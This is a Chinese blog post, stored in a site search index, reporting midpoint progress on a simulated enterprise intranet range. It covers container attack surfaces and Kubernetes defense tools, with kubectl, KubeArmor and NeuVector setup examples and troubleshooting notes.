<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>企业内网模拟靶场搭建3_中期进展</title>
      <link href="/2023/04/03/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA3_%E4%B8%AD%E6%9C%9F%E8%BF%9B%E5%B1%95/"/>
      <url>/2023/04/03/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA3_%E4%B8%AD%E6%9C%9F%E8%BF%9B%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="企业内网模拟靶场搭建3-中期进展"><a href="#企业内网模拟靶场搭建3-中期进展" class="headerlink" title="企业内网模拟靶场搭建3_中期进展"></a>企业内网模拟靶场搭建3_中期进展</h1><h2 id="一、环境搭建进展情况"><a href="#一、环境搭建进展情况" class="headerlink" title="一、环境搭建进展情况"></a>一、环境搭建进展情况</h2><h3 id="1-云服务进展"><a href="#1-云服务进展" class="headerlink" title="1. 云服务进展"></a>1. 云服务进展</h3><h4 id="1-针对云服务防御思路"><a href="#1-针对云服务防御思路" class="headerlink" title="1. 针对云服务防御思路"></a>1. 针对云服务防御思路</h4><p>参考文献：<a href="https://segmentfault.com/a/1190000022004561">https://segmentfault.com/a/1190000022004561</a></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402190342456.png" alt="image-20230402190342456"></p><p>​    自底向上看，底层从硬件安全（可信环境）到宿主机安全 。将容器编排技术（Kubernetes等）看作云上的“操作系统”，它负责自动化部署、扩缩容、管理应用等。在它之上由微服务、Service Mesh、容器技术（Docker等）、容器镜像（仓库）组成。它们之间相辅相成，以这些技术为基础构建云原生安全。</p><p>​    我们再对容器安全做一层抽象，又可以看作构建时安全（Build）、部署时安全（Deployment）、运行时安全（Runtime）。对于安全实施准则，我们将其分为三个阶段：</p><ul><li>攻击前：裁剪攻击面，减少对外暴露的攻击面（本文涉及的场景关键词：隔离）；</li><li>攻击时：降低攻击成功率（本文涉及的场景关键词：加固）；</li><li>攻击后：减少攻击成功后攻击者所能获取的有价值的信息、数据以及增加留后门的难度等。</li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182406353.png" alt="image-20230402190502171" style="zoom:50%;" /><p>​    容器一共有7个攻击面：Linux Kernel、Namespace/Cgroups/Aufs、Seccomp-bpf、Libs、Language VM、User Code、Container(Docker) engine。</p><p>以容器逃逸为风险模型，可以提炼出3个攻击面：</p><ol><li>Linux内核漏洞；</li><li>容器自身；</li><li>不安全部署（配置）。</li></ol><blockquote><ol><li>Linux Kernel：云容器运行在主机操作系统之上，因此，Linux Kernel 是云容器最基本的攻击面之一。攻击者可以通过利用 Linux Kernel 的漏洞来访问和破坏云容器内部的数据和应用程序。</li><li>Namespace/Cgroups/Aufs：这些技术是云容器中的核心组件，用于隔离和限制容器的资源和访问权限。然而，攻击者可以利用这些技术的漏洞，绕过容器的隔离和限制，访问和破坏容器内部的数据和应用程序。</li><li>Seccomp-bpf：这是一种 Linux 内核的安全模块，用于限制容器内的系统调用。攻击者可以通过利用 Seccomp-bpf 的漏洞，绕过容器的系统调用限制，访问和破坏容器内部的数据和应用程序。</li><li>Libs：容器中使用的库也是一个攻击面。攻击者可以通过利用库的漏洞，绕过容器的安全限制，访问和破坏容器内部的数据和应用程序。</li><li>Language VM：容器中运行的虚拟机（例如 Java VM 或 Python VM）也是一个攻击面。攻击者可以利用虚拟机的漏洞，访问和破坏容器内部的数据和应用程序。</li><li>User Code：容器中运行的用户代码也是一个攻击面。攻击者可以通过注入恶意代码或利用应用程序的漏洞，访问和破坏容器内部的数据和应用程序。</li><li>Container(Docker) engine：Docker 引擎本身也是一个攻击面。攻击者可以通过利用 Docker 引擎的漏洞，控制和破坏容器的配置和运行环境</li></ol></blockquote><h4 id="2-主机网络模式探究"><a href="#2-主机网络模式探究" class="headerlink" title="2.主机网络模式探究"></a>2.主机网络模式探究</h4><blockquote><p>Pod为Host网络模式，即直接使用宿主机的网络，不进行网络虚拟化隔离。这样一来，Pod中的所有容器就直接暴露在宿主机的网络环境中，这时候，Pod的PodIP就是其所在Node的IP。<br>从原理上来说，当设定Pod的网络为Host时，是设定了Pod中pod-infrastructure（或pause）容器的网络为Host，Pod内部其他容器的网络指向该容器。</p></blockquote><h5 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">mynginx</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span> <span class="comment"># 宿主机不存在则拉取远程</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h5 id="k8s-pod镜像拉取策略"><a href="#k8s-pod镜像拉取策略" class="headerlink" title="k8s pod镜像拉取策略"></a>k8s pod镜像拉取策略</h5><ul><li>Always：每次创建pod时重新远程拉取镜像</li><li>IfNotPresent：宿主机不存在则拉取远程</li><li>Never：只使用宿主机上存在的，永不拉取</li></ul><h5 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据yaml配置文件创建资源</span></span><br><span class="line">kubectl create -f xxx.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 资源本不存在: 创建新资源。</span></span><br><span class="line"><span class="comment"># 资源已存在: 使配置在已存在的资源上生效</span></span><br><span class="line">kubectl apply -f xxx.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取某类资源列表信息</span></span><br><span class="line">kubectl get pod/deployment/...</span><br><span class="line"><span class="comment"># 删除某类资源</span></span><br><span class="line">kubectl delete pod/deployment/...</span><br><span class="line"><span class="comment"># 详细信息</span></span><br><span class="line">kubectl describe pod</span><br><span class="line"><span class="comment"># 打印日志</span></span><br><span class="line">kubectl logs</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h5><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182423634.png" alt="image-20230402182406353"></p><ul><li>ImagePullBackOff：远程镜像拉取失败</li><li>ErrImageNeverPull：当策略为Never且部署节点上不存在该镜像；从节点上要有这个镜像。<strong>准确的说是调度到哪个节点，那个节点上就要有这个镜像</strong>，否则会报错；<em>当使用本地镜像时需要注意该问题！</em></li></ul><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402190502171.png" alt="image-20230402182423634"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402183537496.png" alt="image-20230402182504542"><br>    以pod形式启动了一个镜像，执行kubectl get pod 查看状态，发现pod一直重启。查看具体的报错信息，发现报错内容为：Back-off restarting failed container</p><ul><li>原因：镜像启动容器后，<strong>容器内部没有常驻进程，导致容器启动成功后即退出</strong>，从而进行了持续的重启。</li><li>解决：只需要给容器加上一个常驻的进程就可以要使Pod持续运行，就必须指定一个永远不会完成的任务。<br>因此在yaml文件中指定一个启动命令，完整内容如下:</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">mynginx</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span> <span class="comment"># 宿主机不存在则拉取远程</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-ce&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="3-K8s防护调研"><a href="#3-K8s防护调研" class="headerlink" title="3.K8s防护调研"></a>3.K8s防护调研</h4><h5 id="调研情况"><a href="#调研情况" class="headerlink" title="调研情况"></a>调研情况</h5><p>参考链接：<a href="https://segmentfault.com/a/1190000041424520">https://segmentfault.com/a/1190000041424520</a></p><blockquote><p>NeuVector 此次开源的并非某个组件或者安全工具，而是一套完整的容器安全平台。这与其他各大云原生安全厂商的开源策略有很大的区别。目前，云原生领域活跃的开源厂商包括：Aqua Security, Falco(sysdig), Anchore, Fairwinds, Portshift 等，以及被红帽收购的 Stackrox，除此还有像 Clair 这样来自大厂的安全工具。而传统的安全厂商虽然都有面向原生安全的产品，然而鲜有软件开源。</p></blockquote><p>开源项目情况：</p><table><thead><tr><th>项目</th><th>厂商</th><th>链接</th><th>Star</th><th>类型</th><th>开源时间</th></tr></thead><tbody><tr><td>clair</td><td>Quay</td><td><a href="https://link.segmentfault.com/?enc=pU8oiTHZr5RfY53xOLKcJg==.KGdB/xnWWPz5+CPRFTHYd8DrYDacO69DsFTAdgh4F9k=">https://github.com/quay/clair</a></td><td>8.4k</td><td>镜像扫描</td><td>2015-11-13</td></tr><tr><td>trivy</td><td>Aqua</td><td><a href="https://link.segmentfault.com/?enc=9P+6eZ90XJ6supn7CELk2w==.DEy4PhTpTYL44fMgVTA5tC5f2GdEz4wIQWZkLIm7d1SF1n5ETrsKewb1JqJUh6DV">https://github.com/aquasecuri…</a></td><td>10.1k</td><td>镜像扫描</td><td>2019-04-11</td></tr><tr><td>kube-hunter</td><td>Aqua</td><td><a href="https://link.segmentfault.com/?enc=ip5/9JoYMEUMyR43OoPLuQ==.kUziJcf5j9KtFiCZCASsQi2Ji1Fj5MEPyPhN5DXHN4ZROqbcycK5e93IChndWih0">https://github.com/aquasecuri…</a></td><td>3.4k</td><td>漏洞扫描</td><td>2018-07-18</td></tr><tr><td>kube-bench</td><td>Aqua</td><td><a href="https://link.segmentfault.com/?enc=VnXjrf9lcroNZKGj32Urxg==.YfHKipW9UTlYSrjXeQmzalxpS3/XJS8oCu5nQtHqmc+RtO3AXQ0eLKGCNDLwBXv6">https://github.com/aquasecuri…</a></td><td>4.5k</td><td>CIS 安全基线</td><td>2017-06-19</td></tr><tr><td>starboard</td><td>Aqua</td><td><a href="https://link.segmentfault.com/?enc=l0b+11AOYGf28ZTLtfy03g==.zKxhbMLpX9InqxSFy2DaLlaoCxBhcpu4fKLJqQiapTgzqKCPt1H/Bhikn83k/w7J">https://github.com/aquasecuri…</a></td><td>968</td><td>Dashboard</td><td>2020-03-17</td></tr><tr><td>tracee</td><td>Aqua</td><td><a href="https://link.segmentfault.com/?enc=65XoYh7cjTTbLKUmekww/g==.yCmpdWBXzTDS/p4Q7kdbFr0FsRtHQvvmyWYIbFpMMRhEFNyrB0xsSyjb1H6HiS/s">https://github.com/aquasecuri…</a></td><td>1.5k</td><td>基于 eBPF 的系统事件追踪</td><td>2019-09-18</td></tr><tr><td>anchore-engine</td><td>anchore</td><td><a href="https://link.segmentfault.com/?enc=Rr1WfoxN/VRJCK9ryuAo+Q==.HcmJ/43asGPilwC8bf0boulNyfBt2tSYspW2Rwkl1qRhBpTzownCwYZQTDnENJBK">https://github.com/anchore/an…</a></td><td>1.4k</td><td>漏洞扫描</td><td>2017-09-06</td></tr><tr><td>kyverno</td><td>kyverno.io</td><td><a href="https://link.segmentfault.com/?enc=Qf/GglfSsVrHLGhRePj96g==.XNabj1J6COCU1hPrqp9dUDbFRCKgM8vj3kmRvrCiOYzXl52JrDWz5PzmwE+CLDmU">https://github.com/kyverno/ky…</a></td><td>1.8k</td><td>Kubernetes 策略与审计</td><td>2019-02-04</td></tr><tr><td>GateKeeper</td><td>OPA (sysdig)</td><td><a href="https://link.segmentfault.com/?enc=uAK20wD+4GhO4DoSJJVerg==.cqqYxr5H7qSXpafJQOxBIB0Q8OnzvdQOD6ordZYgbpgCKOZZP68xmSCj6isn1FeQ">https://github.com/open-polic…</a></td><td>1.3k</td><td>Kubernetes 策略与审计</td><td>2018-10-26</td></tr><tr><td>falco</td><td>falcosecurity(sysdig)</td><td><a href="https://link.segmentfault.com/?enc=zfjgS4LB1wLOV6LHxGPkrA==.rk2daTCsQIM682PM7K/tFNRdY8Bilx0XjDTW7B794NpegPr7kBPVoeKVRljzAJNJ">https://github.com/falcosecur…</a></td><td>4.4k</td><td>基于内核模块的系统事件追踪、警告</td><td>2016-01-19</td></tr><tr><td>terrascan</td><td>accurics.com</td><td><a href="https://link.segmentfault.com/?enc=o4deXWiAI6yMc91sl3nTDQ==.1NOAUenxPYc7K7hNjoblCiALvRoS2yYqi7rd9fI6DpmSHC5TRB3iFdxnQwRbIoPN">https://github.com/accurics/t…</a></td><td>2.7k</td><td>通用的 IaS 配置扫描</td><td>2017-09-11</td></tr><tr><td>Kubei</td><td>portshift</td><td><a href="https://link.segmentfault.com/?enc=8Z+BX3IKSHmopJEgGrtgAA==.EOwNtsIMIQqLPikA6gIChq9zDbL7Z9T5Hw4m8sZkYqyphujiRdgz5PGSyHlELt1Q">https://github.com/cisco-open…</a></td><td>489</td><td>镜像扫描(带面板)</td><td>2020-03-22</td></tr><tr><td>Polaris</td><td>Fairwinds</td><td><a href="https://link.segmentfault.com/?enc=nsg87K2j5PYz/Cn02CkRbA==.PwMmWTftYEEPWCKbavAW7LT9C/4KhgmtgdVQERHjkLjIeKV2Me6g7bVHOzLxdNTK">https://github.com/FairwindsO…</a></td><td>2.4k</td><td>配置扫描与策略</td><td>2018-11-15</td></tr><tr><td>kubesec</td><td>controlplaneio</td><td><a href="https://link.segmentfault.com/?enc=0nU2pC7vg89n3F5YdxX3jg==.LDpgBFKFzWvchuIWPIACA23cSSj3HJyzUu8RxT58UwHYBHJuUNZ3AWAURmUosORE">https://github.com/controlpla…</a></td><td>667</td><td>Kubernetes 配置扫描</td><td>2017-10-10</td></tr><tr><td>KubeEye</td><td>KubeSphere</td><td><a href="https://link.segmentfault.com/?enc=9xeKMMjh9fzW4/gREAADCw==.Xb6v3YjpKxIIiB1hL6knYnMtOyg9kpWNW9ij0sCMtJ2QiXxmo9upkltRE01Zqzfo">https://github.com/kubesphere…</a></td><td>424</td><td>基于策略的 Kubernetes 集群配置扫描</td><td>2020-11-07</td></tr><tr><td>kube-linter</td><td>Stackrox(RedHat)</td><td><a href="https://link.segmentfault.com/?enc=ET2yaus3dxZ+TXajm+GY9g==.EVMsjw6ye9srw8DIhLcG+zw5BRBKROSx9tBSzT99mtYRepIxA6tFoOG0vsVRblBX">https://github.com/stackrox/k…</a></td><td>1.8k</td><td>Kubernetes 配置扫描</td><td>2020-08-13</td></tr></tbody></table><p>上表中，我们列举出了来自各个安全厂商的主要开源项目。从上面的表格中我们可以看出,目前开源安全软件集中在四大类别：</p><ol><li>镜像漏洞扫描</li><li>合规、基线扫描</li><li>Kubernetes 安全策略、配置管理</li><li>威胁检测</li></ol><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182504542.png" alt="image-20230402183537496" style="zoom: 50%;" /><ul><li>Manager, NeuVector 的 Web 控制台，为用户提供了统一的管理 UI，便于用户查看安全事件、管理安全解决方案、规则等。</li><li>Controller, Backend 服务器及控制器，管理如 Enforcer、Scanner 等其他组件，分发安全策略及调度扫描任务。</li><li>Scanner, 用户执行漏洞扫描、基线扫描等任务。</li><li>Enforcer, 一个轻量级的容器，用于拦截系统事件，执行安全策略等。通常以 Daemon set 运行再集群中的每个节点上。</li><li>Updater， 用于更新 CVE 数据库。</li></ul><h5 id="KubeArmor"><a href="#KubeArmor" class="headerlink" title="KubeArmor"></a>KubeArmor</h5><blockquote><p>KubeArmor是一个支持<a href="https://cloud.tencent.com/product/tke?from=20065&from_column=20065">容器</a>的运行时安全实施系统，它可以从系统级别限制容器的行为（如进程执行、文件访问、网络操作和资源利用率）。</p></blockquote><p><a href="https://kubearmor.io/">官网</a><br><a href="https://github.com/kubearmor/KubeArmor">git</a> </p><p>该工具可通过规则配置，对容器指定资源与行为进行监控和拦截，例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.kubearmor.com/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeArmorPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ksp-group-1-proc-path-block</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">multiubuntu</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">group-1</span></span><br><span class="line">  <span class="attr">process:</span></span><br><span class="line">    <span class="attr">matchPaths:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/bin/sleep</span></span><br><span class="line">  <span class="attr">action:</span></span><br><span class="line">    <span class="string">Block</span></span><br></pre></td></tr></table></figure><p>说明：此策略的目的是阻止在带有“group-1”标签的容器中执行“/bin/sleep”。 为此，我们在 selector -&gt; matchLabels 中定义 ‘group-1’ 标签，在 process -&gt; matchPaths 中定义特定路径（’/bin/sleep’）。 此外，我们将“阻止”作为此策略的操作。<br>通过不同的规则配置可达到不同的拦截效果，下面列举出部分：</p><ul><li>Block a specific executable</li><li>Block all executables in a specific directory</li><li>Block all executables in a specific directory and its subdirectories</li><li>Allow specific executables to access certain files only</li><li>…..</li></ul><h4 id="4-NeuVector"><a href="#4-NeuVector" class="headerlink" title="4. NeuVector"></a>4. NeuVector</h4><blockquote><p>NeuVector提供实时深入的容器网络可视化、东西向容器网络监控、主动隔离和保护、容器主机安全以及容器内部安全。<br>NeuVector并非某个组件或者安全工具，而是一套完整的容器安全平台。</p></blockquote><p><a href="https://www.cnblogs.com/panlifeng/p/16326578.html">Install</a></p><h5 id="安装过程："><a href="#安装过程：" class="headerlink" title="安装过程："></a><strong>安装过程：</strong></h5><p>创建 namespace</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create <span class="keyword">namespace</span> neuvector</span><br></pre></td></tr></table></figure><p>部署 CRD (Kubernetes 1.19+ 版本)</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/neuvector</span><span class="regexp">/manifests/main</span><span class="regexp">/kubernetes/crd</span>-k8s-<span class="number">1.19</span>.yaml</span><br></pre></td></tr></table></figure><p>部署 CRD (Kubernetes 1.18 或更低版本)</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/neuvector</span><span class="regexp">/manifests/main</span><span class="regexp">/kubernetes/crd</span>-k8s-<span class="number">1.16</span>.yaml</span><br></pre></td></tr></table></figure><p>配置 RBAC</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="keyword">create</span> clusterrole neuvector<span class="operator">-</span>binding<span class="operator">-</span>app <span class="comment">--verb=get,list,watch,update --resource=nodes,pods,services,namespaces</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrole neuvector<span class="operator">-</span>binding<span class="operator">-</span>rbac <span class="comment">--verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding neuvector<span class="operator">-</span>binding<span class="operator">-</span>app <span class="comment">--clusterrole=neuvector-binding-app --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding neuvector<span class="operator">-</span>binding<span class="operator">-</span>rbac <span class="comment">--clusterrole=neuvector-binding-rbac --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrole neuvector<span class="operator">-</span>binding<span class="operator">-</span>admission <span class="comment">--verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding neuvector<span class="operator">-</span>binding<span class="operator">-</span>admission <span class="comment">--clusterrole=neuvector-binding-admission --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrole neuvector<span class="operator">-</span>binding<span class="operator">-</span>customresourcedefinition <span class="comment">--verb=watch,create,get --resource=customresourcedefinitions</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding  neuvector<span class="operator">-</span>binding<span class="operator">-</span>customresourcedefinition <span class="comment">--clusterrole=neuvector-binding-customresourcedefinition --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrole neuvector<span class="operator">-</span>binding<span class="operator">-</span>nvsecurityrules <span class="comment">--verb=list,delete --resource=nvsecurityrules,nvclustersecurityrules</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding neuvector<span class="operator">-</span>binding<span class="operator">-</span>nvsecurityrules <span class="comment">--clusterrole=neuvector-binding-nvsecurityrules --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> clusterrolebinding neuvector<span class="operator">-</span>binding<span class="operator">-</span><span class="keyword">view</span> <span class="comment">--clusterrole=view --serviceaccount=neuvector:default</span></span><br><span class="line">kubectl <span class="keyword">create</span> rolebinding neuvector<span class="operator">-</span>admin <span class="comment">--clusterrole=admin --serviceaccount=neuvector:default -n neuvector</span></span><br></pre></td></tr></table></figure><p>检查是否有以下 RBAC 对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kubectl get clusterrolebinding  | grep neuvector</span><br><span class="line"></span><br><span class="line">neuvector-binding-admission                            ClusterRole/neuvector-binding-admission                            44h</span><br><span class="line">neuvector-binding-app                                  ClusterRole/neuvector-binding-app                                  44h</span><br><span class="line">neuvector-binding-customresourcedefinition             ClusterRole/neuvector-binding-customresourcedefinition             44h</span><br><span class="line">neuvector-binding-nvadmissioncontrolsecurityrules      ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules      44h</span><br><span class="line">neuvector-binding-nvsecurityrules                      ClusterRole/neuvector-binding-nvsecurityrules                      44h</span><br><span class="line">neuvector-binding-nvwafsecurityrules                   ClusterRole/neuvector-binding-nvwafsecurityrules                   44h</span><br><span class="line">neuvector-binding-rbac                                 ClusterRole/neuvector-binding-rbac                                 44h</span><br><span class="line">neuvector-binding-view                                 ClusterRole/view                                                   44h</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl get rolebinding -n neuvector | grep neuvector</span><br><span class="line"></span><br><span class="line">neuvector-admin         ClusterRole/admin            44h</span><br><span class="line">neuvector-binding-psp   Role/neuvector-binding-psp   44h</span><br></pre></td></tr></table></figure><p>部署 NeuVector</p><p>底层 Runtime 为 Docker</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/neuvector</span><span class="regexp">/manifests/main</span><span class="regexp">/kubernetes/</span><span class="number">5.0</span>.<span class="number">0</span>/neuvector-docker-k8s.yaml</span><br></pre></td></tr></table></figure><p>底层 Runtime 为 Containerd（对于 k3s 和 rke2 可以使用此 yaml 文件）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/neuvector</span><span class="regexp">/manifests/main</span><span class="regexp">/kubernetes/</span><span class="number">5.0</span>.<span class="number">0</span>/neuvector-containerd-k8s.yaml</span><br></pre></td></tr></table></figure><p>1.21 以下的 Kubernetes 版本会提示以下错误，将 yaml 文件下载将 batch/v1 修改为 batch/v1beta1</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: unable to recognize &quot;https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/neuvector-docker-k8s.yaml&quot;: no matches for kind &quot;CronJob&quot; in version &quot;batch/v1&quot;</span><br></pre></td></tr></table></figure><p>1.20.x cronjob 还处于 beta 阶段，1.21 版本开始 cronjob 才正式 GA 。</p><p>默认部署 web-ui 使用的是 loadblance 类型的 Service，为了方便访问修改为 NodePort，也可以通过 Ingress 对外提供服务</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl patch  svc neuvector-service-webui  -n neuvector --type=&#x27;json&#x27; -p &#x27;[&#123;<span class="string">&quot;op&quot;</span>:<span class="string">&quot;replace&quot;</span>,<span class="string">&quot;path&quot;</span>:<span class="string">&quot;/spec/type&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;NodePort&quot;</span>&#125;,&#123;<span class="string">&quot;op&quot;</span>:<span class="string">&quot;add&quot;</span>,<span class="string">&quot;path&quot;</span>:<span class="string">&quot;/spec/ports/0/nodePort&quot;</span>,<span class="string">&quot;value&quot;</span>:30888&#125;]&#x27;</span><br></pre></td></tr></table></figure><h5 id="遇到的问题和解决方案"><a href="#遇到的问题和解决方案" class="headerlink" title="遇到的问题和解决方案"></a><strong>遇到的问题和解决方案</strong></h5><p>​    NeuVector 安装部署需要在k8s集群中部署包括controller，enforcer，manager，scanner在内的若干个pod，通过官方的yaml文件进行部署时，出现了上述的镜像拉取失败而导致的pod启动失败的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230402182725446.png" alt="image-20230402182710512"></p><p><img 